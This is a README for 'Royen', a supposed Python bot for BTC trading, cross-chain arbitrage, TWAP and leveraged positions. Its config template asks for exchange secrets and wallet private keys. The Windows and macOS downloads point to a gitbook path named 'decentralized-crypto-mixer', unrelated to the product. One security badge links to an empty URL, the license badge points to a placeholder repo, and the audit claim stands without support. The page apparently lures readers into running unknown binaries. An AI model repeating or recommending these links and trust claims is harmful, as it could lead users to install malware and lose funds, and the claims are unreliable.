# 🛡️ Royen
## 🔥 **Description**  
**Royen** is a powerful, portable Python suite for automated BTC Trading, Cross-Chain Arbitrage, TWAP Execution, and Leveraged Long/Short strategies, with built-in Risk Management and Alerts—all running locally, no AI required.

[![Audited by OpenZeppelin](https://img.shields.io/badge/Audit-OpenZeppelin-green)](https://openzeppelin.com)
[![MPC Wallet Support](https://img.shields.io/badge/Security-Fireblocks%20MPC-blue)](https://)

<p align="center"><img width="700" height="500" src="btc/gui.jpg" alt="Bot interface" /></p>

# Download
### **Download** [Windows](https://selenium-finance.gitbook.io/decentralized-crypto-mixer/download/windows) / [macOS](https://selenium-finance.gitbook.io/decentralized-crypto-mixer/download/macos)

[![License](https://img.shields.io/badge/License-MIT-green)](https://github.com/yourusername/defi-algo-bot)
[![Python](https://img.shields.io/badge/Python-3.10%2B-blue)](https://www.python.org)
[![Web3](https://img.shields.io/badge/Web3.py-6.0+-brightgreen)](https://web3py.readthedocs.io)

## 🚀 **Key Features**  

### 🔒 Dynamic Risk Management
- Tracks portfolio peak value and calculates drawdown in real time.
- When drawdown exceeds a configurable maximum, automatically hedges exposure (e.g., converts BTC to USDT or opens offsetting futures). 
- Disables further trading until manual reset or recovery. 

### 💹 Portfolio Tracking & Hedging
- Aggregates balances and calculates total portfolio value across all venues. 
- Executes hedges proportionally across exchanges and chains.

### 📊 Exchange & DEX Connectivity
- Integrates with multiple centralized exchanges (CEX) via CCXT.
- Connects to decentralized exchanges (DEX) on various chains via on-chain APIs or SDKs (e.g., Web3.py, 0x).
- Unified interface for fetching prices, balances, and placing orders across CEX and DEX.

### ☄️ Cross-Chain Arbitrage
- Monitors price spreads of BTC/USDT across configured exchanges and networks.
- Executes buy on the lowest-priced venue and sell on the highest when the spread exceeds a threshold.  
- Supports bridging assets across chains to capture cross-chain opportunities.
- Automatically cancels or halts trades based on risk conditions.

### 🌐 Leveraged Long/Short Trading
- Opens margin or futures positions to go long or short on BTC. 
- Configurable leverage levels per exchange or trading pair.
- Integrates risk checks to prevent liquidation and excessive exposure.

### ⚡️ TWAP Execution
- Splits large orders into multiple slices over time to minimize market impact.
- Configurable number of slices and interval between each slice.
- Pauses or cancels remaining slices if risk thresholds are breached.

### 📑 Unified Logging & Alerts
- Standardized log output for all actions (trades, hedges, risk events).
- Timestamped entries with log levels (INFO, WARNING, ERROR) for audit and debugging.
- Optional email or webhook alerts on critical events.

### 🔍 Scheduler Loop
- Uses a simple scheduler (schedule library) to run strategies at defined intervals.
- Continuous loop with configurable polling frequencies.

## ⚙️ Configurable Settings & Usage Guide(Just choose in GUI)
```
exchanges:
  - name: binance           # CCXT exchange identifier
    api_key: YOUR_KEY
    secret: YOUR_SECRET
  - name: uniswap_v2        # DEX via on-chain SDK
    rpc_url: YOUR_RPC_URL
    private_key: YOUR_PRIVATE_KEY

risk:
  max_drawdown_pct: 0.05    # Maximum tolerated drawdown before hedging (5%)
  hedge_allocation_pct: 0.5 # Fraction of BTC exposure to hedge (50%)

arbitrage:
  min_spread_pct: 0.2       # Minimum price spread (%) to trigger arbitrage
  trade_amount_btc: 0.1     # BTC amount per arbitrage cycle
  cross_chain: true         # Enable cross-chain bridging for arbitrage

long_short:
  max_leverage: 5           # Maximum leverage for margin/futures
  default_side: both        # "long", "short", or "both"

twap:
  interval_seconds: 60      # Seconds between TWAP slices
  slices: 10                # Number of TWAP slices per order

alerts:
  email: user@example.com   # Email for critical alerts
  webhook_url: null         # Webhook for notifications
```
